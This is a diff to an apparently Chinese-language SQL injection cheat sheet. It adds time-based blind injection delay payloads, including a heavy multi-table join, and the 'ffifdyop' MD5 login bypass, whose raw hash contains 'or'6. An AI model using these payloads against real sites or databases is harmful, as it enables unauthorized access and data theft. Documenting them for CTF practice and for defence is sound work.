@@ -82,6 +82,7 @@ union select
     handler <handlername> close; #关闭句柄
     ```
 ### 盲注
+
 #### 时间盲注
 
   * 时间盲注
@@ -91,9 +92,11 @@ union select
     利用``SLEEP(n)``
     
     绕过
+
     ```sql
     benchmark(1000000,sha(1))
     pow(99,99)
+    SELECT count(*) FROM information_schema.tables A,information_schema.columns B,information_schema.tables C
     ```
 
 ```python
@@ -423,6 +426,18 @@ $sql = "CREATE TABLE [abc] as select [sql][ (dummy1 TEXT, dummy2 TEXT, `]from sq
 ->
 create table [abc] as select sql from sqlite_master
 ```
+
+### md5 绕过
+
+
+``ffifdyop``
+
+经过md5加密后：276f722736c95d99e921722cf9ed621c
+
+再转换为字符串：``'or'6<乱码>``  即  ``'or'66�]��!r,��b``
+
+类似的还有``12958192621165157191246674165187868492``
+
 
 ## SQLMAP
 
